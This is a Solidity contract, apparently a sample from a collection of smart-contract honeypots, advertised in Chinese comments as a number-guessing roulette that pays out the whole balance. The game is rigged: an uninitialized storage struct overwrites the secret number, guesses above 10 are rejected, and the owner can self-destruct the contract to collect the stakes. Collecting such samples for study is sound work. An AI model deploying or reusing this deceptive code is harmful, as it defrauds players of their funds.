/*
 * @来源: https://github.com/thec00n/smart-contract-honeypots/blob/master/CryptoRoulette.sol
 */
pragma solidity ^0.4.19;

// CryptoRoulette
//
// 猜测在区块链中秘密存储的数字并赢得整个合约余额！每次尝试后都会随机选择一个新数字。
//
// 要玩游戏，请调用play()方法并猜测数字（1-20）。赌注价格：0.1以太

contract CryptoRoulette {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.1 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    function CryptoRoulette() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        // 使用1到20之间的值随机设置secretNumber
        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;
    }

    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= 10);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            // 赢得游戏!
            msg.sender.transfer(this.balance);
        }

        shuffle();
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}